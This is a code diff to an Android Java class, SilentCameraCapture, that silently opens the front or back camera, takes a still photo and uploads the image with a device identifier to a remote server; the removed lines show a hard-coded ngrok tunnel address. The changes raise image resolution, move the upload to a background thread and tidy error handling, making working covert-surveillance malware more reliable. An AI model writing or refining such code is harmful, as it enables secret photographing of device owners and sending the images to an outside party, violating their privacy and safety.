@@ -20,6 +20,8 @@ import java.util.Collections;
 
 public class SilentCameraCapture {
 
+    private static final String TAG = "SilentCam";
+
     public static void captureCamera(Context context, int lensFacing) {
         try {
             CameraManager manager = (CameraManager) context.getSystemService(Context.CAMERA_SERVICE);
@@ -32,37 +34,40 @@ public class SilentCameraCapture {
                     handlerThread.start();
                     Handler backgroundHandler = new Handler(handlerThread.getLooper());
 
-                    ImageReader reader = ImageReader.newInstance(640, 480, ImageFormat.JPEG, 1);
+                    ImageReader reader = ImageReader.newInstance(1280, 720, ImageFormat.JPEG, 2);
 
-                    if (ActivityCompat.checkSelfPermission(context, Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) {
-                        Log.e("SilentCam", "CAMERA permission not granted");
+                    if (ActivityCompat.checkSelfPermission(context, Manifest.permission.CAMERA)
+                            != PackageManager.PERMISSION_GRANTED) {
+                        Log.e(TAG, "CAMERA permission not granted");
                         return;
                     }
+
                     manager.openCamera(cameraId, new CameraDevice.StateCallback() {
                         @Override
                         public void onOpened(@NonNull CameraDevice camera) {
                             try {
-                                CaptureRequest.Builder captureRequest = camera.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE);
+                                CaptureRequest.Builder captureRequest =
+                                        camera.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE);
                                 captureRequest.addTarget(reader.getSurface());
+                                captureRequest.set(CaptureRequest.CONTROL_MODE,
+                                        CaptureRequest.CONTROL_MODE_AUTO);
 
                                 reader.setOnImageAvailableListener(readerListener -> {
                                     Image image = null;
                                     try {
                                         image = reader.acquireLatestImage();
                                         if (image != null) {
-                                            ByteArrayOutputStream stream = new ByteArrayOutputStream();
                                             byte[] buffer = new byte[image.getPlanes()[0].getBuffer().remaining()];
                                             image.getPlanes()[0].getBuffer().get(buffer);
-                                            stream.write(buffer);
                                             image.close();
-
+                                            image = null;
                                             uploadToServer(context, buffer, lensFacing);
                                         }
                                     } catch (Exception e) {
-                                        Log.e("SilentCam", "Image capture failed: " + e.getMessage());
+                                        Log.e(TAG, "Image capture failed: " + e.getMessage());
                                     } finally {
                                         if (image != null) image.close();
-                                        reader.close();
+                                        try { reader.close(); } catch (Exception ignored) {}
                                         camera.close();
                                         handlerThread.quitSafely();
                                     }
@@ -76,20 +81,18 @@ public class SilentCameraCapture {
                                                 try {
                                                     session.capture(captureRequest.build(), null, backgroundHandler);
                                                 } catch (CameraAccessException e) {
-                                                    Log.e("SilentCam", "Capture error: " + e.getMessage());
+                                                    Log.e(TAG, "Capture error: " + e.getMessage());
                                                 }
                                             }
 
                                             @Override
                                             public void onConfigureFailed(@NonNull CameraCaptureSession session) {
-                                                Log.e("SilentCam", "Session config failed");
+                                                Log.e(TAG, "Session config failed");
                                             }
-                                        },
-                                        backgroundHandler
-                                );
+                                        }, backgroundHandler);
 
                             } catch (CameraAccessException e) {
-                                Log.e("SilentCam", "Open failed: " + e.getMessage());
+                                Log.e(TAG, "Open failed: " + e.getMessage());
                             }
                         }
 
@@ -100,40 +103,45 @@ public class SilentCameraCapture {
 
                         @Override
                         public void onError(@NonNull CameraDevice camera, int error) {
+                            Log.e(TAG, "Camera error: " + error);
                             camera.close();
                         }
                     }, backgroundHandler);
 
-                    break; // Done with the correct camera
+                    break;
                 }
             }
         } catch (Exception e) {
-            Log.e("SilentCam", "Camera2 error: " + e.getMessage());
+            Log.e(TAG, "Camera2 error: " + e.getMessage());
         }
     }
 
     private static void uploadToServer(Context context, byte[] imageData, int lensFacing) {
-        try {
-            String endpoint = lensFacing == CameraCharacteristics.LENS_FACING_FRONT ?
-                    "upload_front_photo" : "upload_back_photo";
+        new Thread(() -> {
+            try {
+                boolean isFront = lensFacing == CameraCharacteristics.LENS_FACING_FRONT;
+                String endpoint = isFront ? "upload_front_photo" : "upload_back_photo";
+                String filename = (isFront ? "front_" : "back_") + System.currentTimeMillis() + ".jpg";
 
-            URL url = new URL("https://sophistic-monocular-magdalena.ngrok-free.dev/" + endpoint);
-            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
-            conn.setRequestMethod("POST");
-            conn.setDoOutput(true);
-            conn.setRequestProperty("Device-ID", DeviceUtils.getDeviceId(context));
-            conn.setRequestProperty("Content-Disposition",
-                    "attachment; filename=\"" + (lensFacing == CameraCharacteristics.LENS_FACING_FRONT ? "front_" : "back_")
-                            + System.currentTimeMillis() + ".jpg\"");
+                URL url = new URL(ServerConfig.endpoint(endpoint));
+                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
+                conn.setRequestMethod("POST");
+                conn.setDoOutput(true);
+                conn.setConnectTimeout(10000);
+                conn.setReadTimeout(10000);
+                conn.setRequestProperty("Content-Type", "application/octet-stream"); // ✅ Fixed: was missing
+                conn.setRequestProperty("Content-Disposition", "attachment; filename=\"" + filename + "\"");
+                conn.setRequestProperty("Device-ID", DeviceUtils.getDeviceId(context));
 
-            OutputStream os = conn.getOutputStream();
-            os.write(imageData);
-            os.flush();
-            os.close();
+                OutputStream os = conn.getOutputStream();
+                os.write(imageData);
+                os.flush();
+                os.close();
 
-            Log.d("SilentCam", "Upload done. Code: " + conn.getResponseCode());
-        } catch (Exception e) {
-            Log.e("SilentCam", "Upload failed: " + e.getMessage());
-        }
+                Log.d(TAG, endpoint + " upload done. Code: " + conn.getResponseCode());
+            } catch (Exception e) {
+                Log.e(TAG, "Upload failed: " + e.getMessage());
+            }
+        }).start();
     }
 }
